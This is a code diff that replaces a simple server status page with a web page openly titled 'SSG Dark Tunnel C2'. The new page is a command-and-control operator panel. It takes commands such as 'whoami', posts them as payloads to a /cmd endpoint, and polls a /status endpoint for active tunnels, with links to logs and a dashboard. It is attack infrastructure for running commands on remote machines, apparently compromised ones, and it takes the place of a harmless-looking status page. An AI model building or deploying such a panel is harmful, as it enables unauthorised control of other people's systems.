@@ -1,6 +1,38 @@
-<!DOCTYPE html><html><head><title>SSG Status</title></head>
-<body style="font-family:monospace;background:#000;color:#0f0">
-<h1>🔥 Server Status: OPERATIONAL</h1>
-<pre>Uptime: 99.9% | Load: 0.12 | IPv6: ✓</pre>
-<script>setTimeout(()=>location.reload(),15000)</script>
-</body></html>
+<!DOCTYPE html>
+<html manifest="/manifest.json">
+<head>
+    <title>SSG Dark Tunnel</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#000">
+    <style>body{font-family:monospace;background:#000;color:#0f0;padding:20px}</style>
+</head>
+<body>
+    <h1>🐙 SSG Dark Tunnel C2</h1>
+    <div id="status">Loading...</div>
+    <input id="cmd" placeholder="whoami" style="width:200px;background:#111;color:#0f0">
+    <button onclick="sendCmd()">Send</button>
+    <pre id="output"></pre>
+    
+    <script>
+    async function updateStatus() {
+        const res = await fetch('/status');
+        const data = await res.json();
+        document.getElementById('status').innerHTML = 
+            `Tunnels: ${data.tunnels || 0} | <a href="/logs">Logs</a> | <a href="/dashboard">Dashboard</a>`;
+    }
+    
+    async function sendCmd() {
+        const cmd = document.getElementById('cmd').value;
+        await fetch('/cmd', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({payload: cmd})
+        });
+        updateStatus();
+    }
+    
+    setInterval(updateStatus, 2000);
+    updateStatus();
+    </script>
+</body>
+</html>
